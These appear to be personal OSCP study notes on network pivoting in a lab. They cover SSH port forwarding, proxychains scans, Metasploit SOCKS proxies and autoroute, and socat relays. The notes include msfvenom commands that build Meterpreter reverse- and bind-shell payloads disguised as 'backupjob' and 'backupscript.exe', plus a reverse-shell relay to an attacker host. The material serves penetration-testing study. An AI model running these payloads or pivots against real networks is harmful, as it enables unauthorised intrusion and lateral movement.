<!doctype html><html lang=en-us dir=ltr itemscope itemtype=http://schema.org/Article data-r-output-format=html><head><meta charset=utf-8><meta name=viewport content="height=device-height,width=device-width,initial-scale=1,minimum-scale=1"><meta name=generator content="Hugo 0.131.0"><meta name=generator content="Relearn 8.2.0"><meta name=description content="Scanning the Pivot Target Dynamic Port Forwarding with SSH and SOCKS Tunneling
cube111@local[/local]$ nmap -sT -p22,3306 10.129.202.64 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST Nmap scan report for 10.129.202.64 Host is up (0.12s latency). PORT STATE SERVICE 22/tcp open ssh 3306/tcp closed mysql Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds to acces mysql we can port forward using ssh
cube111@local[/local]$ ssh -L 1234:localhost:3306 ubuntu@10."><meta name=author content><meta name=twitter:card content="summary"><meta name=twitter:title content="Scanning the Pivot Target :: DrakonOps"><meta name=twitter:description content="Scanning the Pivot Target Dynamic Port Forwarding with SSH and SOCKS Tunneling
cube111@local[/local]$ nmap -sT -p22,3306 10.129.202.64 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST Nmap scan report for 10.129.202.64 Host is up (0.12s latency). PORT STATE SERVICE 22/tcp open ssh 3306/tcp closed mysql Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds to acces mysql we can port forward using ssh
cube111@local[/local]$ ssh -L 1234:localhost:3306 ubuntu@10."><meta property="og:url" content="https://irfan123456789-hub.github.io/oscp-notes/pivoting_tunneling/index.html"><meta property="og:site_name" content="DrakonOps"><meta property="og:title" content="Scanning the Pivot Target :: DrakonOps"><meta property="og:description" content="Scanning the Pivot Target Dynamic Port Forwarding with SSH and SOCKS Tunneling
cube111@local[/local]$ nmap -sT -p22,3306 10.129.202.64 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST Nmap scan report for 10.129.202.64 Host is up (0.12s latency). PORT STATE SERVICE 22/tcp open ssh 3306/tcp closed mysql Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds to acces mysql we can port forward using ssh
cube111@local[/local]$ ssh -L 1234:localhost:3306 ubuntu@10."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="OSCP Notes"><meta itemprop=name content="Scanning the Pivot Target :: DrakonOps"><meta itemprop=description content="Scanning the Pivot Target Dynamic Port Forwarding with SSH and SOCKS Tunneling
cube111@local[/local]$ nmap -sT -p22,3306 10.129.202.64 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST Nmap scan report for 10.129.202.64 Host is up (0.12s latency). PORT STATE SERVICE 22/tcp open ssh 3306/tcp closed mysql Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds to acces mysql we can port forward using ssh
cube111@local[/local]$ ssh -L 1234:localhost:3306 ubuntu@10."><meta itemprop=wordCount content="1946"><title>Scanning the Pivot Target :: DrakonOps</title>
<link href=https://irfan123456789-hub.github.io/images/logo.png?1762045851 rel=icon type=image/png><link href=https://irfan123456789-hub.github.io/css/auto-complete/auto-complete.min.css?1762045851 rel=stylesheet><script src=https://irfan123456789-hub.github.io/js/auto-complete/auto-complete.min.js?1762045851 defer></script><script src=https://irfan123456789-hub.github.io/js/search-lunr.min.js?1762045851 defer></script><script src=https://irfan123456789-hub.github.io/js/search.min.js?1762045851 defer></script><script>window.relearn=window.relearn||{},window.relearn.index_js_url="https://irfan123456789-hub.github.io/searchindex.en.js?1762045851"</script><script src=https://irfan123456789-hub.github.io/js/lunr/lunr.min.js?1762045851 defer></script><script src=https://irfan123456789-hub.github.io/js/lunr/lunr.stemmer.support.min.js?1762045851 defer></script><script src=https://irfan123456789-hub.github.io/js/lunr/lunr.multi.min.js?1762045851 defer></script><script src=https://irfan123456789-hub.github.io/js/lunr/lunr.en.min.js?1762045851 defer></script><script>window.relearn=window.relearn||{},window.relearn.contentLangs=["en"]</script><link href=https://irfan123456789-hub.github.io/fonts/fontawesome/css/fontawesome-all.min.css?1762045851 rel=stylesheet media=print onload='this.media="all",this.onload=null'><noscript><link href=https://irfan123456789-hub.github.io/fonts/fontawesome/css/fontawesome-all.min.css?1762045851 rel=stylesheet></noscript><link href=https://irfan123456789-hub.github.io/css/perfect-scrollbar/perfect-scrollbar.min.css?1762045851 rel=stylesheet><link href=https://irfan123456789-hub.github.io/css/theme.min.css?1762045851 rel=stylesheet><link href=https://irfan123456789-hub.github.io/css/format-html.min.css?1762045851 rel=stylesheet id=R-format-style><script>window.relearn=window.relearn||{},window.relearn.min=`.min`,window.relearn.path="/oscp-notes/pivoting_tunneling/index.html",window.relearn.relBasePath="../..",window.relearn.relBaseUri="../..",window.relearn.absBaseUri="https://irfan123456789-hub.github.io",window.relearn.disableAnchorCopy=!1,window.relearn.disableAnchorScrolling=!1,window.relearn.disableInlineCopyToClipboard=!1,window.relearn.enableBlockCodeWrap=!0,window.relearn.getItem=(e,t)=>e.getItem(t),window.relearn.setItem=(e,t,n)=>e.setItem(t,n),window.relearn.removeItem=(e,t)=>e.removeItem(t),window.T_Copy_to_clipboard=`Copy to clipboard`,window.T_Copied_to_clipboard=`Copied to clipboard!`,window.T_Copy_link_to_clipboard=`Copy link to clipboard`,window.T_Link_copied_to_clipboard=`Copied link to clipboard!`,window.T_Reset_view=`Reset view`,window.T_View_reset=`View reset!`,window.T_No_results_found=`No results found for "{0}"`,window.T_N_results_found=`{1} results found for "{0}"`,window.relearn.themevariants=["zen-dark"],window.relearn.customvariantname="my-custom-variant",window.relearn.changeVariant=function(e){var t=document.documentElement.dataset.rThemeVariant;window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e),document.documentElement.dataset.rThemeVariant=e,t!=e&&(document.dispatchEvent(new CustomEvent("themeVariantLoaded",{detail:{variant:e,oldVariant:t}})),window.relearn.markVariant())},window.relearn.markVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant");document.querySelectorAll(".R-variantswitcher select").forEach(t=>{t.value=e})},window.relearn.initVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant")??"";e==window.relearn.customvariantname||(!e||!window.relearn.themevariants.includes(e))&&(e=window.relearn.themevariants[0],window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e)),document.documentElement.dataset.rThemeVariant=e},window.relearn.initVariant(),window.relearn.markVariant()</script><link href=https://irfan123456789-hub.github.io/css/custom.css?1762045851 rel=stylesheet></head><body class="mobile-support html" data-url=https://irfan123456789-hub.github.io/oscp-notes/pivoting_tunneling/index.html><div id=R-body class=default-animation><div id=R-body-overlay></div><nav id=R-topbar><div class=topbar-wrapper><div class=topbar-sidebar-divider></div><div class="topbar-area topbar-area-start" data-area=start><div class="topbar-button topbar-button-sidebar" data-content-empty=disable data-width-s=show data-width-m=hide data-width-l=hide><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleNav() type=button title="Menu (CTRL+ALT+n)"><i class="fa-fw fas fa-bars"></i></button></span></div><div class="topbar-button topbar-button-toc" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleTopbarFlyout(this) type=button title="Table of Contents (CTRL+ALT+t)"><i class="fa-fw fas fa-list-alt"></i></button></span><div class=topbar-content><div class=topbar-content-wrapper><nav class=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#setting-up-to-pivot>Setting up to Pivot</a><ul><li></li></ul></li><li><a href=#using-metasploit-with-proxychains>Using Metasploit with Proxychains</a><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li></ul><ul><li><ul><li></li></ul></li></ul></nav></div></div></div></div><ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype=http://schema.org/BreadcrumbList><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=https://irfan123456789-hub.github.io/index.html><span itemprop=name>DrakonOps</span></a><meta itemprop=position content="1">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=https://irfan123456789-hub.github.io/oscp-notes/index.html><span itemprop=name>OSCP Notes</span></a><meta itemprop=position content="2">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><span itemprop=name>Scanning the Pivot Target</span><meta itemprop=position content="3"></li></ol><div class="topbar-area topbar-area-end" data-area=end><div class="topbar-button topbar-button-prev" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><a href=https://irfan123456789-hub.github.io/oscp-notes/windows-privilege-escalation/index.html title="Windows Privilege Escalation (ðŸ¡)"><i class="fa-fw fas fa-chevron-left"></i></a></span></div><div class="topbar-button topbar-button-next" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><a href=https://irfan123456789-hub.github.io/oscp-notes/the-active-directory/index.html title="The Active Directory (ðŸ¡’)"><i class="fa-fw fas fa-chevron-right"></i></a></span></div><div class="topbar-button topbar-button-more" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleTopbarFlyout(this) type=button title=More><i class="fa-fw fas fa-ellipsis-v"></i></button></span><div class=topbar-content><div class=topbar-content-wrapper><div class="topbar-area topbar-area-more" data-area=more></div></div></div></div></div></div></nav><div id=R-main-overlay></div><main id=R-body-inner class="highlightable oscp-notes" tabindex=-1><div class=flex-block-wrapper><article class=default><header class=headline></header><h1 id=scanning-the-pivot-target>Scanning the Pivot Target</h1><h4 id=scanning-the-pivot-target>Scanning the Pivot Target</h4><p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ nmap -sT -p22,3306 10.129.202.64
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST
</span></span><span style=display:flex><span>Nmap scan report for 10.129.202.64
</span></span><span style=display:flex><span>Host is up (0.12s latency).
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>PORT     STATE  SERVICE
</span></span><span style=display:flex><span>22/tcp   open   ssh
</span></span><span style=display:flex><span>3306/tcp closed mysql
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
</span></span></code></pre></div><p>Â </p><p>Â </p><p>to acces mysql we can port forward using ssh</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>ubuntu@10.129.202.64&#39;s password: 
</span></span><span style=display:flex><span>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> * Documentation:  https://help.ubuntu.com
</span></span><span style=display:flex><span> * Management:     https://landscape.canonical.com
</span></span><span style=display:flex><span> * Support:        https://ubuntu.com/advantage
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  System information as of Thu 24 Feb 2022 05:23:20 PM UTC
</span></span></code></pre></div><p>Â </p><h4 id=confirming-port-forward-with-netstat-on-attackers-machine>Confirming Port Forward with Netstat on attackers machine</h4><p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ netstat -antp | grep 1234
</span></span></code></pre></div><p>Â </p><h4 id=confirming-port-forward-with-nmap>Confirming Port Forward with Nmap</h4><p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ nmap -v -sV -p1234 localhost
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:18 EST
</span></span><span style=display:flex><span>NSE: Loaded 45 scripts for scanning.
</span></span><span style=display:flex><span>Initiating Ping Scan at 12:18
</span></span><span style=display:flex><span>Scanning localhost (127.0.0.1) [2 ports]
</span></span><span style=display:flex><span>Completed Ping Scan at 12:18, 0.01s elapsed (1 total hosts)
</span></span><span style=display:flex><span>Initiating Connect Scan at 12:18
</span></span><span style=display:flex><span>Scanning localhost (127.0.0.1) [1 port]
</span></span><span style=display:flex><span>Discovered open port 1234/tcp on 127.0.0.1
</span></span><span style=display:flex><span>Completed Connect Scan at 12:18, 0.01s elapsed (1 total ports)
</span></span><span style=display:flex><span>Initiating Service scan at 12:18
</span></span><span style=display:flex><span>Scanning 1 service on localhost (127.0.0.1)
</span></span><span style=display:flex><span>Completed Service scan at 12:18, 0.12s elapsed (1 service on 1 host)
</span></span><span style=display:flex><span>NSE: Script scanning 127.0.0.1.
</span></span><span style=display:flex><span>Initiating NSE at 12:18
</span></span><span style=display:flex><span>Completed NSE at 12:18, 0.01s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 12:18
</span></span><span style=display:flex><span>Completed NSE at 12:18, 0.00s elapsed
</span></span><span style=display:flex><span>Nmap scan report for localhost (127.0.0.1)
</span></span><span style=display:flex><span>Host is up (0.0080s latency).
</span></span><span style=display:flex><span>Other addresses for localhost (not scanned): ::1
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>1234/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=forwarding-multiple-ports>Forwarding Multiple Ports</h4><p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
</span></span></code></pre></div><p>Â </p><p>Â </p><h2 id=setting-up-to-pivot>Setting up to Pivot</h2><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ssh -D 9050 ubuntu@10.129.202.64
</span></span></code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ssh -D 9050 ubuntu@10.129.202.64
</span></span></code></pre></div><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ tail -4 /etc/proxychains.conf
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span># meanwile
</span></span><span style=display:flex><span># defaults set to <span style=color:#e6db74>&#34;tor&#34;</span>
</span></span><span style=display:flex><span>socks4 	127.0.0.1 9050
</span></span></code></pre></div><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ proxychains nmap -v -sn 172.16.5.1-200
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=enumerating-the-windows-target-through-proxychains>Enumerating the Windows Target through Proxychains</h4><p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ proxychains nmap -v -Pn -sT 172.16.5.19
</span></span></code></pre></div><p>*************************This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called <code>SOCKS tunneling</code>. One more important note to remember here is that we can only perform a <code>full TCP connect scan</code> over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results. We also need to make sure we are aware of the fact that <code>host-alive</code> checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.***********************************************</p><p>Â </p><h2 id=using-metasploit-with-proxychains>Using Metasploit with Proxychains</h2><p>We can also open Metasploit using proxychains and send all associated traffic through the proxy we have established.</p><p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ proxychains msfconsole
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=using-xfreerdp-with-proxychains>Using xfreerdp with Proxychains</h4><p>Dynamic Port Forwarding with SSH and SOCKS Tunneling</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>ProxyChains-3.1 (http://proxychains.sf.net)
</span></span></code></pre></div><p>Â </p><h4 id=ping-sweep-for-loop-on-linux-pivot-hosts>Ping Sweep For Loop on Linux Pivot Hosts</h4><p>Meterpreter Tunneling & Port Forwarding</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep &#34;bytes from&#34; &amp;) ;done
</span></span></code></pre></div><p>Â </p><h4 id=ping-sweep-for-loop-using-cmd>Ping Sweep For Loop Using CMD</h4><p>Meterpreter Tunneling & Port Forwarding</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find &#34;Reply&#34;</code></pre></div><p>Â </p><p>Â </p><h4 id=ping-sweep-using-powershell>Ping Sweep Using PowerShell</h4><p>Meterpreter Tunneling & Port Forwarding</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>1..254 | % {&#34;172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)&#34;}</code></pre></div><p>Â </p><h1 id=remotereverse-port-forwarding-with-ssh>Remote/Reverse Port Forwarding with SSH</h1><h4 id=using-ssh--r>Using SSH -R</h4><p>Remote/Reverse Port Forwarding with SSH</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;ipAddressofTarget&gt; -vN
</span></span></code></pre></div><p>Â </p><p>Â </p><h1 id=meterpreter-tunneling--port-forwarding>Meterpreter Tunneling & Port Forwarding</h1><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
</span></span></code></pre></div><p>Â </p><h4 id=configuring--starting-the-multihandler>Configuring & Starting the multi/handler</h4><p>Meterpreter Tunneling & Port Forwarding</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>msf6 &gt; use exploit/multi/handler
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=configuring-msfs-socks-proxy>Configuring MSF&rsquo;s SOCKS Proxy</h4><p>Meterpreter Tunneling & Port Forwarding</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>Configuring MSF&#39;s SOCKS Proxy
</span></span><span style=display:flex><span>  Meterpreter Tunneling &amp; Port Forwarding
</span></span><span style=display:flex><span>msf6 &gt; use auxiliary/server/socks_proxy
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>msf6 auxiliary(server/socks_proxy) &gt; set SRVPORT 9050
</span></span><span style=display:flex><span>SRVPORT =&gt; 9050
</span></span><span style=display:flex><span>msf6 auxiliary(server/socks_proxy) &gt; set SRVHOST 0.0.0.0
</span></span><span style=display:flex><span>SRVHOST =&gt; 0.0.0.0
</span></span><span style=display:flex><span>msf6 auxiliary(server/socks_proxy) &gt; set version 4a
</span></span><span style=display:flex><span>version =&gt; 4a
</span></span><span style=display:flex><span>msf6 auxiliary(server/socks_proxy) &gt; run
</span></span><span style=display:flex><span>[*] Auxiliary module running as background job 0.
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[*] Starting the SOCKS proxy server
</span></span><span style=display:flex><span>msf6 auxiliary(server/socks_proxy) &gt; options
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Module options (auxiliary/server/socks_proxy):
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>   Name     Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----     ---------------  --------  -----------
</span></span><span style=display:flex><span>   SRVHOST  0.0.0.0          yes       The address to listen on
</span></span><span style=display:flex><span>   SRVPORT  9050             yes       The port to listen on
</span></span><span style=display:flex><span>   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
</span></span><span style=display:flex><span>                                        5)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Auxiliary action:
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>   Name   Description
</span></span><span style=display:flex><span>   ----   -----------
</span></span><span style=display:flex><span>   Proxy  Run a SOCKS proxy server
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=creating-routes-with-autoroute>Creating Routes with AutoRoute</h4><p>Meterpreter Tunneling & Port Forwarding</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>msf6 &gt; use post/multi/manage/autoroute
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>msf6 post(multi/manage/autoroute) &gt; set SESSION 1
</span></span><span style=display:flex><span>SESSION =&gt; 1
</span></span><span style=display:flex><span>msf6 post(multi/manage/autoroute) &gt; set SUBNET 172.16.5.0
</span></span><span style=display:flex><span>SUBNET =&gt; 172.16.5.0
</span></span><span style=display:flex><span>msf6 post(multi/manage/autoroute) &gt; run
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[!] SESSION may not be compatible with this module:
</span></span><span style=display:flex><span>[!]  * incompatible session platform: linux
</span></span><span style=display:flex><span>[*] Running module against 10.129.202.64
</span></span><span style=display:flex><span>[*] Searching for subnets to autoroute.
</span></span><span style=display:flex><span>[+] Route added to subnet 10.129.0.0/255.255.0.0 from host&#39;s routing table.
</span></span><span style=display:flex><span>[+] Route added to subnet 172.16.5.0/255.255.254.0 from host&#39;s routing table.
</span></span><span style=display:flex><span>[*] Post module execution completed
</span></span></code></pre></div><p>Â </p><p>Â </p><p>It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.</p><p>Meterpreter Tunneling & Port Forwarding</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>meterpreter &gt; run autoroute -s 172.16.5.0/23
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
</span></span><span style=display:flex><span>[!] Example: run post/multi/manage/autoroute OPTION=value [...]
</span></span><span style=display:flex><span>[*] Adding a route to 172.16.5.0/255.255.254.0...
</span></span><span style=display:flex><span>[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
</span></span><span style=display:flex><span>[*] Use the -p option to list all active routes
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><h1 id=socat-redirection-with-a-reverse-shell>Socat Redirection with a Reverse Shell</h1><h4 id=starting-socat-listener>Starting Socat Listener</h4><p>Socat Redirection with a Reverse Shell</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
</span></span></code></pre></div><h4 id=configuring--starting-the-multihandler-1>Configuring & Starting the multi/handler</h4><p>Socat Redirection with a Reverse Shell</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>msf6 &gt; use exploit/multi/handler
</span></span></code></pre></div><p>Â </p><p>Â </p><h1 id=socat-redirection-with-a-bind-shell>Socat Redirection with a Bind Shell</h1><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
</span></span></code></pre></div><p>Â </p><h4 id=creating-the-windows-payload>Creating the Windows Payload</h4><p>Socat Redirection with a Bind Shell</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span style=display:flex><span>[-] No arch selected, selecting arch: x64 from the payload
</span></span><span style=display:flex><span>No encoder specified, outputting raw payload
</span></span><span style=display:flex><span>Payload size: 499 bytes
